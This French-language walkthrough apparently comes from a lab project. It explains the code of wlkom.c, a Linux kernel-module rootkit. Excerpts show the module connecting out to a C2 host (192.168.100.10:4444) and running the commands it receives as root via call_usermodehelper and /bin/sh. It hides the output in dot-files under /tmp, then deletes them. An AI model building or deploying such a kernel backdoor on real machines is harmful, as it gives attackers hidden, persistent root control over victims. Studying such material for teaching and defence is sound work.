# wlkom.c — Le module kernel

`rootkit/wlkom.c` est le cœur du projet. C'est un module noyau Linux (LKM — Loadable Kernel Module) qui tourne dans l'espace kernel de la VM Victime. Tout ce qu'il fait — créer un socket, se connecter en TCP, exécuter des commandes — se passe dans le kernel, sans aucun processus userland visible.

Le fichier fait ~290 lignes. Il est organisé de façon logique : les utilitaires bas niveau en premier, les fonctions de haut niveau ensuite, et l'init/exit à la fin.

---

## Paramètres du module

```c
static char *password_hash = NULL;
static char *c2_ip   = "192.168.100.10";
static int   c2_port = 4444;

module_param(password_hash, charp, 0400);
module_param(c2_ip, charp, 0);
module_param(c2_port, int, 0);
```

`module_param` est la façon idiomatique de passer de la configuration à un LKM. Les valeurs sont fournies à l'exécution via `insmod` ou lues depuis `/etc/modprobe.d/` par `modprobe`. Le `.ko` compilé ne contient aucune valeur en dur — ce qui est essentiel : un `strings wlkom.ko` n'exposerait pas le hash.

Le mode `0400` sur `password_hash` signifie que le paramètre est lisible depuis `/sys/module/wlkom/parameters/password_hash` uniquement par root. C'est une précaution minimale pour éviter qu'un utilisateur non-privilégié puisse lire le hash depuis le sysfs.

`password_hash` est le seul paramètre sans valeur par défaut. Si le module est chargé sans lui, `wlkom_init()` retourne `-EINVAL` et le chargement échoue. C'est voulu : un module sans authentification ne doit pas pouvoir démarrer.

---

## `recv_line` — recevoir une ligne depuis le socket

```c
static int recv_line(struct socket *sock, char *buf, int maxlen)
```

Cette fonction lit le socket **octet par octet** jusqu'à trouver un `\n`. C'est délibérément simple : le protocole est texte, délimité par des sauts de ligne, et les messages sont courts (quelques dizaines d'octets au maximum). Une lecture byte-by-byte sur un socket kernel TCP n'est pas un problème de performance ici.

Le point notable : elle gère `\r\n` (Windows line endings) en ignorant le `\r` si présent avant le `\n`. C'est une robustesse minimale au cas où le C2 tourne sur un système qui ajoute des `\r`.

Elle termine le buffer avec un `\0` et retourne la longueur lue (sans le `\n`), ou une valeur négative en cas d'erreur, ou 0 si la connexion est fermée proprement.

---

## `send_reply` — envoyer une réponse

```c
static int send_reply(struct socket *sock, const char *msg, int len)
```

Un wrapper fin autour de `kernel_sendmsg`. Il construit un `kvec` (kernel iovec) pointant vers le buffer et appelle `kernel_sendmsg` en mode bloquant. Rien de remarquable, mais avoir un wrapper évite de répéter le boilerplate `kvec`/`msg_hdr` dans chaque endroit où on envoie quelque chose.

---

## `execute_and_send_output` — exécuter une commande et renvoyer le résultat

C'est la fonction la plus complexe du module. Elle prend une chaîne de commande shell, l'exécute côté victime, et envoie stdout, stderr et l'exit code au C2.

### Construire la commande shell

```c
snprintf(cmd_buf, sizeof(cmd_buf),
    "/bin/sh -c '(%s) > /tmp/.wlkom_out 2> /tmp/.wlkom_err'", cmd);
```

On enveloppe la commande dans `/bin/sh -c '...'` pour avoir accès à toutes les fonctionnalités du shell (pipes, redirections, etc.). Les redirections `> /tmp/.wlkom_out 2> /tmp/.wlkom_err` capturent stdout et stderr dans deux fichiers temporaires séparés. Le nom commence par `.` pour être légèrement moins visible dans un `ls`.

### Appeler `call_usermodehelper`

```c
char *argv[] = { "/bin/sh", "-c", cmd_buf, NULL };
char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

`call_usermodehelper` est le mécanisme standard du kernel pour exécuter un binaire userland depuis l'espace kernel. Le flag `UMH_WAIT_PROC` est crucial : il bloque le kthread jusqu'à la fin du processus fils. Sans ça, on lirait les fichiers temporaires avant que la commande ait fini d'écrire dedans.

Le processus fils hérite des droits du kernel, c'est-à-dire root. Toutes les commandes envoyées depuis le C2 s'exécutent en root sur la victime.

### Décoder l'exit status

```c
exit_code = (ret >> 8) & 0xFF;
```

`call_usermodehelper` retourne le statut brut au format `wait4` : les 8 bits de poids fort contiennent l'exit code du processus (`$?` en shell), les 8 bits de poids faible contiennent le signal si le processus a été tué par un signal. On décale de 8 bits pour extraire l'exit code standard.

### Lire les fichiers temporaires

```c
f = filp_open(path, O_RDONLY, 0);
...
kernel_read(f, buf, buf_size - 1, &pos);
filp_close(f, NULL);
```

`filp_open` et `kernel_read` sont les APIs kernel pour lire des fichiers depuis l'espace noyau. `filp_open` retourne un `struct file *`, `kernel_read` lit jusqu'à `buf_size - 1` octets dans `buf`. La position `pos` est passée par pointeur — `kernel_read` la met à jour après chaque lecture.

Le buffer est alloué sur le tas avec `kmalloc`. On alloue en heap et non sur la pile (`char buf[SIZE]`) parce que les stacks kernel sont petites (4 ou 8 Ko selon la config) et une sortie de commande peut faire plusieurs Ko. Un dépassement de pile kernel panique immédiatement le système.

### Envoyer la réponse et nettoyer

Après lecture, on envoie le contenu formaté via `send_reply`, puis on supprime les fichiers temporaires avec un autre appel `call_usermodehelper` :

```c
char *rm_argv[] = { "/bin/rm", "-f", "/tmp/.wlkom_out", "/tmp/.wlkom_err", NULL };
call_usermodehelper("/bin/rm", rm_argv, envp, UMH_WAIT_PROC);
```

C'est une tentative de nettoyage basique. Les fichiers ne restent pas indéfiniment sur le disque de la victime.

---

## `authenticate_c2` — valider l'authentification

```c
static int authenticate_c2(struct socket *sock)
```

Le C2 envoie `AUTH <hash>\n` dès qu'un client se connecte. Cette fonction lit cette ligne, vérifie qu'elle commence par `AUTH `, et compare le reste avec `password_hash`.

La comparaison est faite avec `strncmp` sur les 8 premiers caractères (un hash FNV-1a 32-bit en hexadécimal fait exactement 8 caractères). Si la comparaison échoue, la fonction retourne une erreur et `connection_thread` ferme la connexion puis retente.

Si `password_hash` est NULL à ce stade, on retourne une erreur — mais en pratique c'est impossible car `wlkom_init` a déjà vérifié sa présence au chargement.

---

## `do_connect` — établir la connexion TCP

```c
static int do_connect(struct socket **sock_out)
```

Cette fonction crée un socket TCP kernel et tente de se connecter au C2.

### Créer le socket

```c
sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
```

`sock_create` (sans le suffixe `_kern`) crée un socket associé au namespace réseau courant. C'est l'API standard pour les sockets depuis l'espace kernel.

### Parser l'adresse IP

```c
in4_pton(c2_ip, -1, (u8 *)&addr.sin_addr.s_addr, '\0', NULL);
```

`in4_pton` convertit une chaîne IPv4 en représentation binaire réseau. Il n'y a pas de `inet_aton` dans le kernel — c'est une fonction userland de la libc. `in4_pton` est son équivalent kernel.

### Se connecter

```c
sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
```

La connexion est bloquante. Si le C2 n'est pas accessible, elle retourne immédiatement avec une erreur (généralement `-ECONNREFUSED`, code -111). Le retry est géré dans `connection_thread`.

---

## `connection_thread` — la boucle principale

```c
static int connection_thread(void *data)
```

C'est le kthread qui tourne en arrière-plan pendant toute la durée de vie du module. Sa boucle :

```
while (!kthread_should_stop()) {
    do_connect()
    si échec → sleep 5s → retry

    authenticate_c2()
    si échec → ferme socket → retry

    boucle:
        recv_line()  ← bloquant, attend une commande
        si déconnexion → break
        execute_and_send_output()
    
    ferme socket → retry
}
```

**Pourquoi `schedule_timeout_interruptible` et pas `msleep` pour le retry ?**

`schedule_timeout_interruptible` rend le thread interruptible pendant l'attente : si `kthread_stop` est appelé (au `rmmod`), le thread se réveille immédiatement au lieu d'attendre les 5 secondes. Avec `msleep`, chaque `rmmod` pendant un retry bloquerait 5 secondes.

**Pourquoi le thread est bloqué sur `recv_line` et comment le débloquer ?**

`kernel_recvmsg` est bloquant par conception. Quand le thread y est bloqué, il ne peut pas tester `kthread_should_stop()`. La seule façon de le débloquer est de fermer le socket depuis l'extérieur — ce que fait `wlkom_exit` avec `kernel_sock_shutdown`.

---

## `wlkom_init` et `wlkom_exit` — init et cleanup du module

### Init

```c
static int __init wlkom_init(void)
```

Vérifie que `password_hash` est fourni et non vide, puis lance le kthread avec `kthread_run`. Le module est opérationnel dès que le thread démarre — l'init retourne immédiatement sans attendre la connexion.

### Exit

```c
static void __exit wlkom_exit(void)
```

L'ordre des opérations est critique :

1. `kernel_sock_shutdown(sock, SHUT_RDWR)` — force `recvmsg` à retourner avec une erreur, débloquant le thread
2. `kthread_stop(task)` — attend que le thread se termine proprement
3. `sock_release(sock)` — libère le socket

Si on inversait 1 et 2, `kthread_stop` bloquerait indéfiniment car le thread ne peut pas sortir de `recvmsg` tout seul. Si on faisait 3 avant 2, on libérerait un socket encore en cours d'utilisation par le thread — corruption mémoire garantie.
